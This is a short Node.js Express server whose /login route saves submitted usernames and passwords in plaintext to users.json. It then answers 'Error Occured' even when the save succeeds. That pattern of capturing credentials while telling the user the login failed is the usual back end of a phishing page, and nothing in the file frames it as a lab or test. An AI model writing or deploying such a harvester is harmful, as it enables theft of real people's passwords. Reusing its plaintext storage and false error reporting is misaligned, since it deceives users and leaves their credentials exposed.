// server.js

const express = require('express');
const bodyParser = require('body-parser');
const fs = require('fs');

const app = express();
const PORT = 3001;

// Middleware to parse JSON and URL-encoded bodies
app.use(bodyParser.json());
app.use(bodyParser.urlencoded({ extended: true }));

// Serve static files (for your HTML, CSS, and client-side JS)
app.use(express.static('public'));

// Route to handle login form submission and save data to JSON file
app.post('/login', (req, res) => {
    const { username, password } = req.body;

    // Construct data object
    const userData = {
        username,
        password
    };

    // Convert data object to JSON format
    const jsonData = JSON.stringify(userData);

    // Save data to JSON file
    fs.writeFile('users.json', jsonData, (err) => {
        if (err) {
            console.error(err);
            res.status(500).send('Error saving data');
        } else {
            console.log('Error Occured');
            res.send('Error Occured');
        }
    });
});

// Start server
app.listen(PORT, () => {
    console.log(`Server is running on http://localhost:${PORT}`);
});
